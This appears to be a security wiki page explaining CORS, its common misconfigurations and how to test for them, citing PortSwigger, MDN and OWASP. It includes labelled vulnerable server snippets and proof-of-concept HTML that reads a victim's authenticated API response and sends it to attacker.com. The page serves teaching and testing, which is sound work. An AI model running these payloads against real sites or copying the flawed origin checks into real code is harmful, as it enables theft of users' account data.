# CORS — Cross-Origin Resource Sharing

← [[Browser-Security-Model]] | [[Same-Origin-Policy]]

---

CORS is the mechanism that lets servers **selectively relax** the Same-Origin Policy. It's also one of the most commonly misconfigured security controls on the web.

---

## Why CORS Exists

A React app on `app.example.com` needs to call an API on `api.example.com`. Without CORS, SOP would block the JS from reading the API response.

CORS lets `api.example.com` say: "I trust `app.example.com` — it's allowed to read my responses."

---

## How CORS Works

### Simple Requests

For "simple" requests (GET, POST with basic content types), the browser just sends the request and the origin header:

```http
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
```

The server responds with an `Access-Control-Allow-Origin` header:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
```

If the origin matches, the browser lets the JS read the response.

### Preflight Requests

For "non-simple" requests (PUT, DELETE, custom headers, JSON body), the browser first sends a preflight `OPTIONS` request:

```http
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
```

Server responds with what it allows:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

Only if this preflight succeeds does the browser send the actual request.

### `Access-Control-Allow-Credentials`

By default, CORS requests don't include cookies. If the server sets:

```http
Access-Control-Allow-Credentials: true
```

...and the JS uses `fetch(..., { credentials: 'include' })`, cookies are sent with cross-origin requests.

> [!WARNING]
> `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true` is **invalid** — browsers reject this combination. But developers sometimes try to work around this in insecure ways.

---

## CORS Misconfigurations

This is where the vulns are. A misconfigured CORS policy lets an attacker's page read responses from the victim's origin using the victim's session cookies.

### 1. Origin Reflected Without Validation

```python
# Vulnerable
response.headers['Access-Control-Allow-Origin'] = request.headers['Origin']
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

The server echoes back whatever origin was sent. **Any origin can read any response.**

**Test:** Send `Origin: https://attacker.com` — if the response reflects it back and has `Allow-Credentials: true`, it's critical.

### 2. Null Origin Trusted

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

The `null` origin is sent by sandboxed iframes and `data:` URLs. An attacker can trigger a `null` origin request from a sandboxed iframe on their page:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
fetch('https://victim.com/api/data', {credentials:'include'})
  .then(r => r.text()).then(d => fetch('https://attacker.com/?data='+btoa(d)))
</script>"></iframe>
```

### 3. Weak Origin Validation (Regex Bypass)

```python
# Vulnerable: only checks if origin ends with 'example.com'
if request.origin.endswith('example.com'):
    allow_origin = request.origin
```

Bypassed with `https://attacker-example.com` or `https://evil.com?x=example.com`.

### 4. Wildcard on Sensitive Endpoints

```http
Access-Control-Allow-Origin: *
```

Wildcard without credentials is fine for public APIs (CDN assets). It's a problem if used on **authenticated endpoints** — even without credentials, if the attacker can make a request with the victim's auth token in a custom header, or the endpoint doesn't require credentials at all but returns sensitive data.

---

## Exploitation PoC

If you find a CORS misconfiguration with `Allow-Credentials: true`:

```html
<script>
fetch('https://victim.com/api/account', { credentials: 'include' })
  .then(response => response.text())
  .then(data => {
    fetch('https://attacker.com/steal?d=' + btoa(data))
  })
</script>
```

Host this on attacker.com, have the victim visit it while logged into victim.com. The response — including sensitive account data — gets exfiltrated.

---

## Testing CORS

1. Send a request to an API endpoint with `Origin: https://attacker.com`
2. Check if `Access-Control-Allow-Origin: https://attacker.com` is in the response
3. Check if `Access-Control-Allow-Credentials: true` is present
4. Try `Origin: null`
5. Try variations: `Origin: https://victim.com.attacker.com`, `Origin: https://attackervictim.com`

---

## Quick Reference

| Configuration | Vulnerable? | Why |
|--------------|-------------|-----|
| `ACAO: *` | Low risk | No credentials sent |
| `ACAO: *` + `ACAC: true` | Invalid (browsers block) | N/A |
| `ACAO: <reflected origin>` + `ACAC: true` | **Critical** | Any origin reads authenticated responses |
| `ACAO: null` + `ACAC: true` | **High** | Sandboxed iframe bypass |
| Weak regex match + `ACAC: true` | **High** | Origin bypass |

---

*Back to [[Browser-Security-Model]] | Related: [[Same-Origin-Policy]] | [[HTTP-Headers]]*

*Sources: PortSwigger Web Security Academy, MDN Web Docs, OWASP Testing Guide*
